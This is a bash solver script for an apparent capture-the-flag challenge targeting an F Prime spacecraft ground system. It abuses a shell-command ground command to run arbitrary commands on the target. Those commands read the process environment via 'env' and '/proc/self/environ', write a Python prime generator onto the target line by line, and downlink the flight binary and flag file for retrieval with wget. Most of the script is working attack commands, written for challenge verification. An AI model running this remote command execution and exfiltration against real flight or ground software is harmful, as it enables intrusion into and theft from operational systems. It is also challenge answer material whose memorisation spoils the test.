#!/bin/bash

echo "Solver for fprime-exploitation challenge"
# source /home/ground/fprime/fprime-venv/bin/activate

echo "Source python virtual env activate"
if (which fprime-cli); then
  . ./fprime-venv/bin/activate
fi

BASE_IP=${CHAL_HOST:-localhost}
BASE_PORT=${CHAL_PORT:-5000}

WEB_IP=${BASE_IP}
WEB_PORT=${BASE_PORT}
GDS_IP=${BASE_IP}
GDS_PORT=$((BASE_PORT + 1))

DICT_LOCATION="${FPRIME_CLI_DICT:-./dict}"

WAIT_FOR_DOWNLINK=${WAIT_FOR_DOWNLINK:-30}

echo "Get enviroment for satellite.exe process"
echo "fprime-cli command-send fileManager.ShellCommand --arguments \"env\" \"environment.txt\" -d ${DICT_LOCATION}/RefTopologyAppDictionary.xml -ip \"${GDS_IP}\" -p \"${GDS_PORT}\""
echo "fprime-cli command-send fileManager.ShellCommand --arguments \"cat /proc/self/environ\" \"environment.txt\" -d ${DICT_LOCATION}/RefTopologyAppDictionary.xml -ip \"${GDS_IP}\" -p \"${GDS_PORT}\""
fprime-cli command-send fileManager.ShellCommand --arguments "env" "environment.txt" -d ${DICT_LOCATION}/RefTopologyAppDictionary.xml -ip "${GDS_IP}" -p "${GDS_PORT}"
fprime-cli command-send fileManager.ShellCommand --arguments "cat /proc/self/environ" "environment.txt" -d ${DICT_LOCATION}/RefTopologyAppDictionary.xml -ip "${GDS_IP}" -p "${GDS_PORT}"
fprime-cli command-send fileDownlink.SendFile --arguments "environment.txt" "environment.txt" -d ${DICT_LOCATION}/RefTopologyAppDictionary.xml -ip "${GDS_IP}" -p "${GDS_PORT}"
echo "sleep 10 to wait for environment.txt to downlink from spacecraft"
sleep 10
echo "Download environment from ground web server"
if [ -f ./environment.txt ];then
    rm ./environment.txt
fi
echo "wget http://${WEB_IP}:${WEB_PORT}/download/files/environment.txt"
while ! wget http://${WEB_IP}:${WEB_PORT}/download/files/environment.txt;
do
sleep 5
done
if grep -i "FLAG" environment.txt; then
  echo "Found FLAG in environment, solver failed"
  cat environment.txt
  exit 1
fi
echo "Satellite enviroment clean, continue.."

echo "Show that include attempt.txt won't unlock flag"
echo "fprime-cli command-send flagSvr.FS_FlagEnable --arguments \"attempt.txt\" -d ${DICT_LOCATION}/RefTopologyAppDictionary.xml -ip \"${GDS_IP}\" -p \"${GDS_PORT}\""
fprime-cli command-send flagSvr.FS_FlagEnable --arguments "attempt.txt" -d ${DICT_LOCATION}/RefTopologyAppDictionary.xml -ip "${GDS_IP}" -p "${GDS_PORT}"

echo "Get FSW Binary using ground commands"
echo "fprime-cli command-send fileDownlink.SendFile --arguments \"satellite.exe\" \"satellite.exe\" -d ${DICT_LOCATION}/RefTopologyAppDictionary.xml -ip \"${GDS_IP}\" -p \"${GDS_PORT}\""
fprime-cli command-send fileDownlink.SendFile --arguments "satellite.exe" "satellite.exe" -d ${DICT_LOCATION}/RefTopologyAppDictionary.xml -ip "${GDS_IP}" -p "${GDS_PORT}"

echo "sleep ${WAIT_FOR_DOWNLINK} to wait for satellite.exe to downlink from spacecraft"
sleep ${WAIT_FOR_DOWNLINK}

echo "Download executable from ground web server"
if [ -f ./satellite.exe ];then
    rm ./satellite.exe
fi
echo "wget http://${WEB_IP}:${WEB_PORT}/download/files/satellite.exe"

while ! wget http://${WEB_IP}:${WEB_PORT}/download/files/satellite.exe;
do
sleep 5
done
# curl -o satellite.exe http://${WEB_IP}:${WEB_PORT}/download/files/satellite.exe

if [ ! -f ./satellite.exe ]; then
    echo "Could not download spacecraft executable satellite.exe, ERROR!!!"
    exit 1
fi

echo "File Parameters for satellite.exe"
file satellite.exe
echo ""

echo "Reverse engineer satellite.ext to figure out the correct number of primes to send"
echo ""

echo "Create prime number attempt.txt"
LINES=$(cat genprime.py)
IFS=''
while read -r line; do
  echo "fprime-cli command-send fileManager.ShellCommand --arguments \"echo \"${line}\"\" \"genprime.py\" -d ${DICT_LOCATION}/RefTopologyAppDictionary.xml -ip \"${GDS_IP}\" -p \"${GDS_PORT}\""
  fprime-cli command-send fileManager.ShellCommand --arguments "echo \"${line}\"" "genprime.py" -d ${DICT_LOCATION}/RefTopologyAppDictionary.xml -ip "${GDS_IP}" -p "${GDS_PORT}"
done < genprime.py

echo "fprime-cli command-send fileManager.ShellCommand --arguments \"python3 genprime.py\" \"attempt_solver.txt\" -d ${DICT_LOCATION}/RefTopologyAppDictionary.xml -ip \"${GDS_IP}\" -p \"${GDS_PORT}\""
fprime-cli command-send fileManager.ShellCommand --arguments "python3 genprime.py" "attempt_solver.txt" -d ${DICT_LOCATION}/RefTopologyAppDictionary.xml -ip "${GDS_IP}" -p "${GDS_PORT}"

sleep 5

echo "Run updated attempt.txt to enable flag retrieval"
echo "fprime-cli command-send flagSvr.FS_FlagEnable --arguments \"attempt_solver.txt\" -d ${DICT_LOCATION}/RefTopologyAppDictionary.xml -ip \"${GDS_IP}\" -p \"${GDS_PORT}\""
fprime-cli command-send flagSvr.FS_FlagEnable --arguments "attempt_solver.txt" -d ${DICT_LOCATION}/RefTopologyAppDictionary.xml -ip "${GDS_IP}" -p "${GDS_PORT}"

sleep 5

echo "Get Flag file using ground commands"
echo "fprime-cli command-send fileDownlink.SendFile --arguments \"flag.txt\" \"flag.txt\" -d ${DICT_LOCATION}/RefTopologyAppDictionary.xml -ip \"${GDS_IP}\" -p \"${GDS_PORT}\""
fprime-cli command-send fileDownlink.SendFile --arguments "flag.txt" "flag.txt" -d ${DICT_LOCATION}/RefTopologyAppDictionary.xml -ip "${GDS_IP}" -p "${GDS_PORT}"

echo "sleep ${WAIT_FOR_DOWNLINK} to wait for flag.exe to downlink from spacecraft"
sleep ${WAIT_FOR_DOWNLINK}

echo "Download executable from ground web server"
if [ -f ./flag.txt ];then
    rm ./flag.txt
fi
echo "wget http://${WEB_IP}:${WEB_PORT}/download/files/flag.txt"

while ! wget http://${WEB_IP}:${WEB_PORT}/download/files/flag.txt;
do
sleep 5
done
echo -e "FLAG:"
cat flag.txt
echo ""
